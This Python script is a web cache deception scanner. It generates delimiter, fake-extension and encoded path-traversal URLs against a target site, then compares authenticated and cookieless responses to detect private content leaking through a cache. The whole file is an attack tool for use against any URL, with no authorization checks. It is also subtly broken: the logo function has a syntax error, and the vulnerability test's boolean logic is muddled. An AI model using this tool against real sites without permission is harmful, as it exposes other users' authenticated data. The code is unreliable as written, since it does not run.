import requests
import random
import string
import sys
import urllib.parse
from typing import List, Tuple, Dict
import argparse
from concurrent.futures import ThreadPoolExecutor
import re

def print_logo():
    green = '\033[32m'
    bright_green = '\033[92m'
    reset = '\033[0m'

    logo = rf"""
{green}           .___.__                             .___
{green}  ____   __| _/|  |__   ____  __ __  ____    __| _/
{green}_/ ___\ / __ | |  |  \ /  _ \|  |  \/    \  / __ |
{green}\  \___/ /_/ | |   Y  (  <_> )  |  /   |  \/ /_/ |
{green} \___  >____ | |___|  /\____/|____/|___|  /\____ |
{green}     \/     \/      \/                  \/      \/
                                                            {bright_green}by gankd{reset}
"""
    print(logo))

def read_delimiters(wordlist_path: str) -> List[str]:
    """Read delimiters from wordlist file."""
    try:
        with open(wordlist_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: Wordlist file not found: {wordlist_path}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading wordlist: {str(e)}")
        sys.exit(1)

def generate_random_chars(length: int = 3) -> str:
    """Generate random string of specified length."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def parse_header(header_str: str) -> Dict[str, str]:
    """Parse header string in format 'Name: Value' into a dictionary."""
    try:
        name, value = header_str.split(':', 1)
        return {name.strip(): value.strip()}
    except ValueError:
        print(f"[!] Error: Invalid header format. Use 'Name: Value' format")
        sys.exit(1)

def extract_static_directories(response_text: str, url: str, headers: Dict[str, str]) -> List[str]:
    """Extract static resource directories from response body and root path."""
    static_dirs = set()
    pattern = r'(?:href|src|action|link\s+href|script\s+src|img\s+src)\s*=\s*["]?(/[\w\-/]+(?:\.\w+)?)'
    paths = re.findall(pattern, response_text)
    
    for path in paths:
        components = [p for p in path.split('/') if p]
        if not components:
            continue
            
        if '.' in components[-1]:
            components = components[:-1]
            
        current_path = ''
        for component in components:
            current_path = f"{current_path}/{component}"
            if any(keyword in current_path.lower() for keyword in ['static', 'css', 'js', 'images', 'img', 'assets']):
                static_dirs.add(current_path)
    
    try:
        base_url = urllib.parse.urljoin(url, '/')
        root_response = requests.get(base_url, headers=headers, timeout=15)
        root_paths = re.findall(pattern, root_response.text)
        
        for path in root_paths:
            components = [p for p in path.split('/') if p]
            if not components:
                continue
                
            if '.' in components[-1]:
                components = components[:-1]
                
            current_path = ''
            for component in components:
                current_path = f"{current_path}/{component}"
                if any(keyword in current_path.lower() for keyword in ['static', 'css', 'js', 'images', 'img', 'assets']):
                    static_dirs.add(current_path)
                    
    except requests.exceptions.RequestException as e:
        print(f"\033[33m[!] Warning: Could not fetch root path (/): {str(e)}\033[0m")
    
    return sorted(list(static_dirs))

def create_osn_test_urls(base_url: str, static_dirs: List[str], recursion_depth: int) -> List[str]:
    """Create test URLs for origin server normalization testing."""
    parsed_url = urllib.parse.urlparse(base_url)
    original_path = parsed_url.path.strip('/')
    test_urls = []

    random_string = generate_random_chars()
    root_url = f"{parsed_url.scheme}://{parsed_url.netloc}/..%2f{original_path}?{random_string}"
    test_urls.append(root_url)

    if recursion_depth == 1:
        base_dirs = set()
        for static_dir in static_dirs:
            parts = [p for p in static_dir.split('/') if p]
            if parts:
                base_dirs.add(parts[0])
        
        for base_dir in base_dirs:
            random_string = generate_random_chars()
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{base_dir}/..%2f{original_path}?{random_string}"
            test_urls.append(test_url)
    else:
        for static_dir in static_dirs:
            parts = [p for p in static_dir.split('/') if p]
            current_path = ""
            
            for i in range(min(recursion_depth, len(parts))):
                current_path = '/'.join(parts[:i+1])
                random_string = generate_random_chars()
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{current_path}/..%2f{original_path}?{random_string}"
                if test_url not in test_urls:
                    test_urls.append(test_url)

    return test_urls

def create_csn_test_urls(base_url: str, static_dirs: List[str], delimiters: List[str], recursion_depth: int) -> List[str]:
    """Create test URLs for client-side normalization testing."""
    parsed_url = urllib.parse.urlparse(base_url)
    original_path = parsed_url.path.strip('/')
    test_urls = []

    base_dirs = set()
    for static_dir in static_dirs:
        parts = [p for p in static_dir.split('/') if p]
        if parts:
            for i in range(min(recursion_depth, len(parts))):
                base_dirs.add('/'.join(parts[:i+1]))

    for base_dir in base_dirs:
        for delimiter in delimiters:
            random_chars = generate_random_chars()
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{original_path}{delimiter}%2f%2e%2e%2f{base_dir}?{random_chars}"
            test_urls.append(test_url)

    return test_urls

def create_test_urls(base_url: str, delimiters: List[str], extensions: List[str]) -> List[str]:
    """Create test URLs combining delimiters and extensions."""
    urls = []
    parsed_url = urllib.parse.urlparse(base_url)
    path = parsed_url.path.rstrip('/')
    
    # Use default delimiters if none provided
    if not delimiters:
        delimiters = ['/', '!', ';', ',', ':', '|', '#']
    
    # Test each combination of delimiter and extension
    for delimiter in delimiters:
        for ext in extensions:
            random_chars = generate_random_chars()
            
            # Create path with delimiter
            if delimiter == '/':
                new_path = f"{path}/{random_chars}{ext}"
            else:
                new_path = f"{path}{delimiter}{random_chars}{ext}"
            
            new_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                new_path,
                parsed_url.params,
                parsed_url.query,
                parsed_url.fragment
            ))
            urls.append(new_url)

    return urls

def check_cache_behavior(url: str, headers: Dict[str, str], verbose: bool = False) -> Tuple[str, bool, Dict, bool]:
    """Check if URL is vulnerable to cache poisoning."""
    try:
        request_headers = {
            'User-Agent': 'r4nd0m'
        }
        request_headers.update(headers)

        debug_info = {}

        first_response = requests.get(url, headers=request_headers, timeout=15)
        first_cache = first_response.headers.get('X-Cache', '')
        debug_info['first_status'] = first_response.status_code
        debug_info['first_cache'] = first_cache
        debug_info['first_body'] = first_response.text

        headers_without_cookies = request_headers.copy()
        if 'Cookie' in headers_without_cookies:
            del headers_without_cookies['Cookie']
        
        second_response = requests.get(url, headers=headers_without_cookies, timeout=15)
        second_cache = second_response.headers.get('X-Cache', '')
        debug_info['second_status'] = second_response.status_code
        debug_info['second_cache'] = second_cache
        debug_info['second_body'] = second_response.text

        is_vulnerable = (
            (
                first_cache and second_cache and
                'miss' in first_cache.lower() and
                'hit' in second_cache.lower() and
                first_response.status_code == 200 and
                second_response.status_code == 200 and
                first_response.text == second_response.text
            )
            or
            (
                'cache-control' not in first_response.headers and
                second_response.status_code == 200 and
                'cache-control' in second_response.headers
            )
            or
            (
                'age' not in first_response.headers and
                second_response.status_code == 200 and
                'age' in second_response.headers
            )
            and
            (
               first_response.headers.get('Content-Length') == second_response.headers.get('Content-Length')
            )
        )
        
        return url, is_vulnerable, debug_info, False

    except requests.exceptions.Timeout:
        if verbose:
            print(f"[+] Tested: {url} | Not vulnerable")
        return url, False, {}, True
    
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"[+] Tested: {url} | Not vulnerable")
        return url, False, {}, False

def get_technique_description(technique: str) -> str:
    """Return a description of each testing technique."""
    descriptions = {
        'default': "Testing for basic cache poisoning using different file extensions",
        'osn': "Origin Server Normalization - Testing path traversal via static resource directories",
        'csn': "Client-Side Normalization - Testing path traversal with delimiters and static resources",
    }
    return descriptions.get(technique, "Unknown technique")

def main():
    print_logo()

    parser = argparse.ArgumentParser(description='Test for web cache poisoning vulnerabilities')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-H', '--header', help='Header in format "Name: Value" -> Used to authenticate the requests')
    parser.add_argument('-w', '--wordlist', help='Path to custom wordlist', default=None)
    parser.add_argument('-e', '--extensions', help='Comma-separated list of extensions to test (default: ".js,.css,.png")', default='.js,.css,.png')
    parser.add_argument('-T', '--technique', choices=['osn', 'csn', 'default'], help='Specific technique to run')
    parser.add_argument('-r', type=int, choices=[1, 2, 3], help='Recursion depth for OSN/CSN testing (default: 1)', default=1)
    parser.add_argument('-v', '--verbose', action='store_true', help='Show verbose output')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads to use (default: 10)')
    args = parser.parse_args()

    headers = {}
    if args.header:
        headers.update(parse_header(args.header))

    print(f"\n[*] Testing cache behavior for: {args.url}")
    print(f"[*] Using headers: {headers}")

    techniques_to_run = [args.technique] if args.technique else ['default', 'osn', 'csn']
    recursion_depth = args.r
    static_dirs = None

    total_techniques = len(techniques_to_run)
    current_technique = 0

    for technique in techniques_to_run:
        current_technique += 1
        print(f"\n{'='*60}")
        print(f"[*] Starting Technique {current_technique}/{total_techniques}: {technique.upper()}")
        print(f"[*] Description: {get_technique_description(technique)}")
        print(f"{'='*60}")

        test_urls = []
        
        if technique == 'default':
            extensions = [ext.strip() for ext in args.extensions.split(',') if ext.strip()]
            delimiters = read_delimiters(args.wordlist) if args.wordlist else []
            print(f"[*] Using extensions: {extensions}")
            if delimiters:
                print(f"[*] Using {len(delimiters)} delimiters from wordlist")
            test_urls = create_test_urls(args.url, delimiters, extensions)
        
        elif technique in ['osn', 'csn']:
            if static_dirs is None:
                try:
                    print("[*] Fetching static resource directories...")
                    initial_response = requests.get(args.url, headers=headers)
                    static_dirs = extract_static_directories(initial_response.text, args.url, headers)
                    if static_dirs:
                        print("[*] Found static resource directories:")
                        for dir in static_dirs:
                            print(f"   - {dir}")
                except requests.exceptions.RequestException as e:
                    print(f"[!] Error making initial request: {str(e)}")
                    continue

            if static_dirs:
                if technique == 'osn':
                    print(f"[*] Generating OSN test URLs with recursion depth {recursion_depth}...")
                    test_urls = create_osn_test_urls(args.url, static_dirs, recursion_depth)
                else:  # csn technique
                    delimiters = read_delimiters(args.wordlist)
                    print(f"[*] Loaded {len(delimiters)} delimiters from wordlist")
                    print(f"[*] Generating CSN test URLs with recursion depth {recursion_depth}...")
                    test_urls = create_csn_test_urls(args.url, static_dirs, delimiters, recursion_depth)

        if test_urls:
            print(f"[*] Testing {len(test_urls)} URLs for {technique.upper()} technique")
            print("-" * 60)

            timeout_count = 0
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = []
                for url in test_urls:
                    futures.append(executor.submit(check_cache_behavior, url, headers, args.verbose))
                
                for future in futures:
                    url, is_vulnerable, debug_info, had_timeout = future.result()
                    if had_timeout:
                        timeout_count += 1
                    if is_vulnerable:
                        print(f"\n\033[32m[!] VULNERABLE URL FOUND!\033[0m")
                        print(f"\033[32m[!] URL: {url}\033[0m")
                        print(f"[!] Cache behavior: {debug_info.get('first_cache')} -> {debug_info.get('second_cache')}")
                        print("[!] Authenticated content leaked to unauthenticated user!")
                    elif args.verbose:
                        print(f"[+] Tested: {url} | Not vulnerable")

            print(f"\n[*] Completed {technique.upper()} technique scan ({current_technique}/{total_techniques})")
            
            if timeout_count > 0:
                print(f"\033[33m[!] Warning: {timeout_count} requests timed out during the scan (timeout=15s)\033[0m")
        else:
            print(f"[!] No test URLs were generated for {technique.upper()} technique")

if __name__ == "__main__":
    main()
